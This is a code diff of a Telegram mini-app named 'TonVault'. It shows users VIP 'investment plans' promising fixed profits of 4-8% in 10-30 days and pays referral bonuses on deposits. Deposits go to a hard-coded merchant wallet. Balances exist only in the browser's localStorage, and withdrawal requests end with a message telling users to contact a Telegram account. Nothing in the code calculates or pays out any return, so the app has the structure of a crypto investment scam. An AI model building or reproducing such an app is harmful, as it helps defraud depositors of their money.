+                <p class="info-text">Note: Task rewards cannot be withdrawn. Only plan profits are withdrawable.</p>
+            </div>
+        </div>
 
-                <!-- VIP 2 -->
-                <div class="vip-card vip-2" id="vip2-card">
-                    <div class="vip-header">
-                        <span class="vip-badge">VIP 2</span>
-                        <span class="vip-price">25 <span>TON</span></span>
-                    </div>
-                    <ul class="vip-features">
-                        <li>20-day profit 4%</li>
-                        <li>Investment period: 20 days</li>
-                        <li>VIP support</li>
-                        <li>Instant withdrawal</li>
-                    </ul>
-                    <button class="activate-btn" id="vip2-btn" onclick="activatePlan(2)">
-                        Activate VIP 2
-                    </button>
-                </div>
+        <!-- ========== TASK PAGE ========== -->
+        <div class="page" id="page-task">
+            <h3 style="margin-bottom:15px;">🎯 Tasks</h3>
+            <div class="task-card">
+                <div class="task-info"><div class="task-title">Join Telegram Channel</div><div class="task-reward">Reward: 0.01 TON</div></div>
+                <button class="task-btn" id="task-channel-btn" onclick="doTask('channel')">Join</button>
+            </div>
+            <div class="task-card">
+                <div class="task-info"><div class="task-title">Join Telegram Group</div><div class="task-reward">Reward: 0.01 TON</div></div>
+                <button class="task-btn" id="task-group-btn" onclick="doTask('group')">Join</button>
+            </div>
+            <p class="info-text" style="margin-top:15px;">⚠️ Task rewards are added to your balance but cannot be withdrawn. Only plan profits can be withdrawn.</p>
+        </div>
 
-                <!-- VIP 3 -->
-                <div class="vip-card vip-3" id="vip3-card">
-                    <div class="vip-header">
-                        <span class="vip-badge">VIP 3</span>
-                        <span class="vip-price">50 <span>TON</span></span>
-                    </div>
-                    <ul class="vip-features">
-                        <li>15-day profit 6%</li>
-                        <li>Investment period: 15 days</li>
-                        <li>24/7 support</li>
-                        <li>Instant withdrawal</li>
-                        <li>Monthly rewards</li>
-                    </ul>
-                    <button class="activate-btn" id="vip3-btn" onclick="activatePlan(3)">
-                        Activate VIP 3
-                    </button>
-                </div>
-
-                <!-- VIP 4 -->
-                <div class="vip-card vip-4" id="vip4-card">
-                    <div class="vip-header">
-                        <span class="vip-badge">VIP 4</span>
-                        <span class="vip-price">100 <span>TON</span></span>
-                    </div>
-                    <ul class="vip-features">
-                        <li>10-day profit 8%</li>
-                        <li>Investment period: 10 days</li>
-                        <li>Dedicated support</li>
-                        <li>Instant withdrawal</li>
-                        <li>Weekly rewards</li>
-                        <li>Investment consultation</li>
-                    </ul>
-                    <button class="activate-btn" id="vip4-btn" onclick="activatePlan(4)">
-                        Activate VIP 4
-                    </button>
+        <!-- ========== REFERRAL PAGE ========== -->
+        <div class="page" id="page-referral">
+            <div class="ref-card">
+                <h3>👥 Referral Program</h3>
+                <p style="font-size:13px;color:#a0a0c0;margin:10px 0;">Earn 5% of every deposit your referrals make!</p>
+                <div class="ref-link" id="ref-link">Loading...</div>
+                <button class="copy-btn" onclick="copyRefLink()">📋 Copy Referral Link</button>
+            </div>
+            <div class="ref-card">
+                <h3>📊 Your Stats</h3>
+                <div class="ref-stats">
+                    <div class="ref-stat"><div class="ref-stat-number" id="ref-count">0</div><div class="ref-stat-label">Referrals</div></div>
+                    <div class="ref-stat"><div class="ref-stat-number" id="ref-earnings">0.00</div><div class="ref-stat-label">TON Earned</div></div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Success Modal -->
-    <div class="modal" id="success-modal">
-        <div class="modal-content">
-            <div class="modal-icon">✅</div>
-            <h3>Payment Successful!</h3>
-            <p id="modal-message">Your plan has been activated.</p>
-            <button class="close-modal-btn" onclick="closeModal()">Got it</button>
+    <!-- FAQ Modal -->
+    <div class="modal" id="faq-modal">
+        <div class="modal-content" style="max-height:80vh;overflow-y:auto;text-align:right;">
+            <h3>❓ Frequently Asked Questions</h3>
+            <div class="faq-item"><div class="faq-question">How to deposit?</div><div class="faq-answer">1. Copy the deposit address<br>2. Open your TON wallet (Tonkeeper, etc.)<br>3. Send the amount with your Telegram UID in the comment<br>4. Go to @TonVaultVerifyBot and send /verify to confirm<br>5. Your balance will be updated after admin verification</div></div>
+            <div class="faq-item"><div class="faq-question">How to buy a plan?</div><div class="faq-answer">1. Deposit TON first<br>2. Go to Home page<br>3. Click "Buy" on your desired plan<br>4. The amount will be deducted from your balance</div></div>
+            <div class="faq-item"><div class="faq-question">When can I withdraw?</div><div class="faq-answer">Withdrawals are only available AFTER your plan period ends. For example, VIP 1 can withdraw after 30 days.</div></div>
+            <div class="faq-item"><div class="faq-question">Can I withdraw task rewards?</div><div class="faq-answer">No. Task rewards (0.01 TON each) are added to your balance but CANNOT be withdrawn. Only profits from investment plans are withdrawable.</div></div>
+            <div class="faq-item"><div class="faq-question">How does referral work?</div><div class="faq-answer">Share your referral link. When someone joins and makes a deposit, you earn 5% of their deposit amount.</div></div>
+            <button class="modal-btn" onclick="closeModal()" style="margin-top:15px;">Close</button>
         </div>
     </div>
 
-    <!-- Error Modal -->
-    <div class="modal" id="error-modal">
+    <div class="modal" id="generic-modal">
         <div class="modal-content">
-            <div class="modal-icon">❌</div>
-            <h3>Error!</h3>
-            <p id="error-message">Something went wrong.</p>
-            <button class="close-modal-btn" onclick="closeModal()">OK</button>
+            <div class="modal-icon" id="generic-modal-icon">✅</div>
+            <h3 id="generic-modal-title">Success</h3>
+            <p id="generic-modal-message"></p>
+            <button class="modal-btn" onclick="closeModal()">OK</button>
+        </div>
+    </div>
+
+    <!-- Bottom Nav -->
+    <div class="bottom-nav">
+        <div class="nav-item active" onclick="switchPage('home')">
+            <div class="nav-icon">🏠</div><div class="nav-label">Home</div>
+        </div>
+        <div class="nav-item" onclick="switchPage('wallet')">
+            <div class="nav-icon">💳</div><div class="nav-label">Wallet</div>
+        </div>
+        <div class="nav-item" onclick="switchPage('task')">
+            <div class="nav-icon">✅</div><div class="nav-label">Task</div>
+        </div>
+        <div class="nav-item" onclick="switchPage('referral')">
+            <div class="nav-icon">👥</div><div class="nav-label">Referral</div>
         </div>
     </div>
 
     <script>
-        // ============ CONFIGURATION ============
-        const MERCHANT_WALLET = 'UQDxPjlH5H0zwvE6sEzAo_VaL-i7rys77iiZDoA0DaD_i7LZ';
-        const GITHUB_USERNAME = 'zaraton2026';
-        const GITHUB_REPO = 'ton-invest';
-        const MANIFEST_URL = `https://${GITHUB_USERNAME}.github.io/${GITHUB_REPO}/tonconnect-manifest.json`;
-
-        // ============ INITIALIZATION ============
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
-        let tonConnectUI = null;
-        let currentWalletAddress = null;
-        let currentBalance = 0;
+        const MERCHANT_WALLET = 'UQDxPjlH5H0zwvE6sEzAo_VaL-i7rys77iiZDoA0DaD_i7LZ';
+        const BOT_USERNAME = 'TonVaultVerifyBot';
+        const CHANNEL_URL = 'https://t.me/zaraton2026ai';
+        const GROUP_URL = 'https://t.me/chatzaraton';
+        
+        let userId = 'unknown';
+        let userData = {};
 
-        function initTONConnect() {
-            if (typeof TONConnectUI === 'undefined') {
-                console.error('TON Connect not loaded');
-                setTimeout(initTONConnect, 500);
-                return;
-            }
-
-            tonConnectUI = new TONConnectUI({
-                manifestUrl: MANIFEST_URL,
-                buttonRootId: null
-            });
-
-            tonConnectUI.connectionRestored.then(restored => {
-                if (restored && tonConnectUI.connected) {
-                    updateWalletInfo();
-                }
-            });
-        }
-
-        // ============ MENU FUNCTIONS ============
-        function toggleMenu() {
-            const menu = document.getElementById('side-menu');
-            const overlay = document.getElementById('side-menu-overlay');
-            const btn = document.getElementById('hamburger-btn');
-            
-            menu.classList.toggle('active');
-            overlay.classList.toggle('active');
-            btn.classList.toggle('active');
-        }
-
-        function toggleHistoryPanel() {
-            const panel = document.getElementById('history-panel');
-            const arrow = document.getElementById('history-arrow');
-            
-            panel.classList.toggle('active');
-            if (panel.classList.contains('active')) {
-                arrow.textContent = '▲';
-                loadHistoryPanel();
-            } else {
-                arrow.textContent = '▼';
-            }
-        }
-
-        function loadHistoryPanel() {
-            const transactions = getTransactions();
-            const container = document.getElementById('history-mini-container');
-            
-            if (transactions.length === 0) {
-                container.innerHTML = '<p style="color: #a0a0c0; text-align: center; font-size: 11px;">No transactions yet</p>';
-                return;
-            }
-            
-            container.innerHTML = transactions.slice(0, 10).map(t => `
-                <div class="history-mini-item">
-                    <span class="history-mini-plan">VIP ${t.plan}</span>
-                    <span class="history-mini-amount">${t.amount} TON</span>
-                    <span style="color: #a0a0c0; font-size: 10px;">${t.date}</span>
-                </div>
-            `).join('');
-        }
-
-        // ============ WALLET CONNECTION ============
-        async function handleWalletConnection() {
-            if (!tonConnectUI) {
-                showError('TON Connect library is loading. Please wait a moment.');
-                return;
-            }
-
-            try {
-                if (tonConnectUI.connected) {
-                    await tonConnectUI.disconnect();
-                    resetWalletUI();
-                    return;
-                }
-
-                showLoading(true);
-                const walletsList = await tonConnectUI.getWallets();
-                const embeddedWallet = walletsList.find(w => w.embedded);
-                
-                if (embeddedWallet) {
-                    await tonConnectUI.connectWallet(embeddedWallet);
-                    await updateWalletInfo();
-                } else {
-                    await tonConnectUI.openModal();
-                }
-            } catch (error) {
-                console.error('Wallet connection error:', error);
-                if (!error.message?.includes('User rejected')) {
-                    showError('Connection failed. Please try again.');
-                }
-            } finally {
-                showLoading(false);
-            }
-        }
-
-        async function updateWalletInfo() {
-            if (!tonConnectUI || !tonConnectUI.connected) return;
-
-            const wallet = tonConnectUI.wallet;
-            if (!wallet?.account?.address) return;
-            
-            currentWalletAddress = wallet.account.address;
-            
-            try {
-                const response = await fetch(
-                    `https://toncenter.com/api/v2/getAddressBalance?address=${currentWalletAddress}`
-                );
-                const data = await response.json();
-                currentBalance = (data.result / 1000000000).toFixed(2);
-            } catch (error) {
-                currentBalance = '0.00';
-            }
-
-            updateWalletUI();
+        // Init
+        if (tg.initDataUnsafe?.user) {
+            userId = tg.initDataUnsafe.user.id;
+            document.getElementById('user-uid').textContent = userId;
+            document.getElementById('ref-link').textContent = `https://t.me/${BOT_USERNAME}?start=${userId}`;
             loadUserData();
         }
 
-        function updateWalletUI() {
-            const btn = document.getElementById('connect-wallet-btn');
-            const info = document.getElementById('wallet-info');
-            
-            if (currentWalletAddress) {
-                btn.textContent = '✓ Disconnect';
-                btn.classList.add('connected');
-                info.classList.add('active');
-                document.getElementById('wallet-address').textContent = 
-                    currentWalletAddress.substring(0, 8) + '...' + 
-                    currentWalletAddress.substring(currentWalletAddress.length - 6);
-                document.getElementById('wallet-balance').textContent = currentBalance + ' TON';
-            } else {
-                resetWalletUI();
-            }
-        }
-
-        function resetWalletUI() {
-            const btn = document.getElementById('connect-wallet-btn');
-            const info = document.getElementById('wallet-info');
-            
-            btn.textContent = 'Connect Tonkeeper';
-            btn.classList.remove('connected');
-            info.classList.remove('active');
-            currentWalletAddress = null;
-            currentBalance = 0;
-        }
-
-        // ============ PAYMENT PROCESSING ============
-        async function activatePlan(planNumber) {
-            if (!currentWalletAddress) {
-                showError('Please connect your TON wallet first!');
-                return;
-            }
-
-            const prices = {1: 10, 2: 25, 3: 50, 4: 100};
-            const price = prices[planNumber];
-            
-            if (planNumber === 1) {
-                const plans = getActivatedPlans();
-                if (plans.includes(1)) {
-                    showError('VIP 1 has already been activated and can only be used once!');
-                    return;
-                }
-            }
-
-            const btn = document.getElementById(`vip${planNumber}-btn`);
-            btn.disabled = true;
-
-            try {
-                showLoading(true);
-                
-                const transaction = {
-                    validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [
-                        {
-                            address: MERCHANT_WALLET,
-                            amount: (price * 1000000000).toString()
-                        }
-                    ]
-                };
-
-                const result = await tonConnectUI.sendTransaction(transaction);
-                
-                if (result?.boc) {
-                    const plans = getActivatedPlans();
-                    plans.push(planNumber);
-                    localStorage.setItem(getStorageKey() + '_plans', JSON.stringify(plans));
-                    
-                    addTransaction(planNumber, price, result.boc);
-                    
-                    if (planNumber === 1) {
-                        btn.classList.add('activated');
-                        btn.textContent = '✓ Already Activated';
-                        btn.onclick = null;
-                    }
-                    
-                    showSuccess(`🎉 VIP ${planNumber} activated successfully!\n\nAmount paid: ${price} TON\n\nWelcome to the investment platform!`);
-                }
-            } catch (error) {
-                console.error('Payment error:', error);
-                if (error.message?.includes('User rejected') || error.message?.includes('canceled')) {
-                    showError('Payment was cancelled.');
-                } else {
-                    showError('Transaction failed. Please try again.');
-                }
-            } finally {
-                showLoading(false);
-                btn.disabled = false;
-            }
-        }
-
-        // ============ DATA MANAGEMENT ============
-        function getStorageKey() {
-            return 'tonvault_data_' + (currentWalletAddress || 'guest');
-        }
-
-        function getActivatedPlans() {
-            return JSON.parse(localStorage.getItem(getStorageKey() + '_plans') || '[]');
-        }
-
-        function getTransactions() {
-            return JSON.parse(localStorage.getItem(getStorageKey() + '_txs') || '[]');
-        }
-
-        function addTransaction(plan, amount, txHash) {
-            const transactions = getTransactions();
-            transactions.unshift({
-                plan: plan,
-                amount: amount,
-                txHash: txHash.substring(0, 10) + '...',
-                date: new Date().toLocaleDateString('en-US'),
-                time: new Date().toLocaleTimeString('en-US')
-            });
-            localStorage.setItem(getStorageKey() + '_txs', JSON.stringify(transactions));
-        }
-
         function loadUserData() {
-            if (currentWalletAddress) {
-                const plans = getActivatedPlans();
-                checkActivatedPlans(plans);
-            }
+            const saved = localStorage.getItem('tonvault_' + userId);
+            userData = saved ? JSON.parse(saved) : { balance: 0, taskBalance: 0, plans: [], tasks: {}, referrals: [], refEarnings: 0 };
+            updateUI();
         }
 
-        function checkActivatedPlans(plans) {
-            if (plans.includes(1)) {
+        function saveUserData() {
+            localStorage.setItem('tonvault_' + userId, JSON.stringify(userData));
+        }
+
+        function updateUI() {
+            const totalBalance = (userData.balance || 0) + (userData.taskBalance || 0);
+            document.getElementById('user-balance').textContent = totalBalance.toFixed(2) + ' TON';
+            document.getElementById('ref-count').textContent = (userData.referrals || []).length;
+            document.getElementById('ref-earnings').textContent = (userData.refEarnings || 0).toFixed(2);
+
+            // Check VIP 1
+            if ((userData.plans || []).includes(1)) {
                 const btn = document.getElementById('vip1-btn');
                 btn.classList.add('activated');
                 btn.textContent = '✓ Already Activated';
                 btn.onclick = null;
             }
-        }
 
-        // ============ UI HELPERS ============
-        function showLoading(show) {
-            const spinner = document.getElementById('loading-spinner');
-            if (show) {
-                spinner.classList.add('active');
-            } else {
-                spinner.classList.remove('active');
+            // Check tasks
+            if (userData.tasks?.channel) {
+                const btn = document.getElementById('task-channel-btn');
+                btn.classList.add('done');
+                btn.textContent = '✓ Done';
+            }
+            if (userData.tasks?.group) {
+                const btn = document.getElementById('task-group-btn');
+                btn.classList.add('done');
+                btn.textContent = '✓ Done';
             }
         }
 
-        function showSuccess(message) {
-            document.getElementById('modal-message').textContent = message;
-            document.getElementById('success-modal').classList.add('active');
+        function switchPage(page) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById('page-' + page).classList.add('active');
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+            if (page === 'home') updateUI();
         }
 
-        function showError(message) {
-            document.getElementById('error-message').textContent = message;
-            document.getElementById('error-modal').classList.add('active');
+        function toggleMenu() {
+            document.getElementById('side-menu').classList.toggle('active');
+            document.getElementById('side-menu-overlay').classList.toggle('active');
+            document.getElementById('hamburger-btn').classList.toggle('active');
         }
 
-        function closeModal() {
-            document.getElementById('success-modal').classList.remove('active');
-            document.getElementById('error-modal').classList.remove('active');
+        function openFAQ() {
+            document.getElementById('faq-modal').classList.add('active');
+            toggleMenu();
         }
 
-        if (typeof TONConnectUI !== 'undefined') {
-            TONConnectUI.onStatusChange(wallet => {
-                if (wallet) {
-                    updateWalletInfo();
-                } else {
-                    resetWalletUI();
-                }
+        function copyDepositAddress() {
+            navigator.clipboard.writeText(MERCHANT_WALLET).then(() => {
+                showModal('✅', 'Copied!', 'Address copied. Send TON with your UID in the comment.');
             });
         }
 
-        // ============ STARTUP ============
-        window.addEventListener('load', () => {
-            initTONConnect();
-            const savedPlans = JSON.parse(localStorage.getItem('tonvault_data_guest_plans') || '[]');
-            if (savedPlans.length > 0) {
-                checkActivatedPlans(savedPlans);
+        function copyRefLink() {
+            navigator.clipboard.writeText(document.getElementById('ref-link').textContent).then(() => {
+                showModal('✅', 'Copied!', 'Referral link copied!');
+            });
+        }
+
+        function buyPlan(planNumber) {
+            if (planNumber === 1 && (userData.plans || []).includes(1)) {
+                showModal('❌', 'Error', 'VIP 1 can only be activated once.');
+                return;
             }
-        });
+            const prices = {1: 10, 2: 25, 3: 50, 4: 100};
+            const price = prices[planNumber];
+            const totalBalance = (userData.balance || 0) + (userData.taskBalance || 0);
+            
+            if (totalBalance < price) {
+                showModal('❌', 'Insufficient Balance', `You need ${price} TON. Please deposit first.`);
+                return;
+            }
+
+            // Deduct from balance first, then task balance
+            let remaining = price;
+            if (userData.balance >= remaining) {
+                userData.balance -= remaining;
+                remaining = 0;
+            } else {
+                remaining -= userData.balance;
+                userData.balance = 0;
+                userData.taskBalance -= remaining;
+            }
+
+            userData.plans = userData.plans || [];
+            userData.plans.push(planNumber);
+            const now = Date.now();
+            const periods = {1: 30, 2: 20, 3: 15, 4: 10};
+            userData.planExpiry = userData.planExpiry || {};
+            userData.planExpiry[planNumber] = now + (periods[planNumber] * 24 * 60 * 60 * 1000);
+            saveUserData();
+            updateUI();
+            showModal('✅', 'Plan Activated!', `VIP ${planNumber} activated successfully!`);
+        }
+
+        function doTask(type) {
+            if (userData.tasks?.[type]) {
+                showModal('❌', 'Already Done', 'You already completed this task.');
+                return;
+            }
+            const url = type === 'channel' ? CHANNEL_URL : GROUP_URL;
+            window.open(url, '_blank');
+            
+            userData.tasks = userData.tasks || {};
+            userData.tasks[type] = true;
+            userData.taskBalance = (userData.taskBalance || 0) + 0.01;
+            saveUserData();
+            updateUI();
+            showModal('✅', 'Task Completed!', '0.01 TON added to your balance (non-withdrawable).');
+        }
+
+        function requestWithdraw() {
+            const addr = document.getElementById('withdraw-address').value.trim();
+            const amount = parseFloat(document.getElementById('withdraw-amount').value);
+            
+            if (!addr) { showModal('❌', 'Error', 'Enter your wallet address.'); return; }
+            if (!amount || amount <= 0) { showModal('❌', 'Error', 'Enter a valid amount.'); return; }
+            if (amount > (userData.balance || 0)) { showModal('❌', 'Error', 'Insufficient withdrawable balance. Only plan profits can be withdrawn.'); return; }
+            
+            // Check if any plan period has ended
+            const now = Date.now();
+            let canWithdraw = false;
+            if (userData.planExpiry) {
+                for (const [plan, expiry] of Object.entries(userData.planExpiry)) {
+                    if (now >= expiry) canWithdraw = true;
+                }
+            }
+            
+            if (!canWithdraw) {
+                showModal('❌', 'Cannot Withdraw', 'You can only withdraw after your plan period ends.');
+                return;
+            }
+
+            showModal('✅', 'Request Sent', `Withdrawal of ${amount} TON to ${addr} has been submitted. Contact @zaraton2026 for processing.`);
+        }
+
+        function showModal(icon, title, message) {
+            document.getElementById('generic-modal-icon').textContent = icon;
+            document.getElementById('generic-modal-title').textContent = title;
+            document.getElementById('generic-modal-message').innerHTML = message.replace(/\n/g, '<br>');
+            document.getElementById('generic-modal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('faq-modal').classList.remove('active');
+            document.getElementById('generic-modal').classList.remove('active');
+        }
 
         window.onclick = function(event) {
-            if (event.target.classList.contains('modal')) {
-                closeModal();
-            }
+            if (event.target.classList.contains('modal')) closeModal();
+            if (event.target.classList.contains('side-menu-overlay')) toggleMenu();
         }
+
+        updateUI();
     </script>
 </body>
 </html>
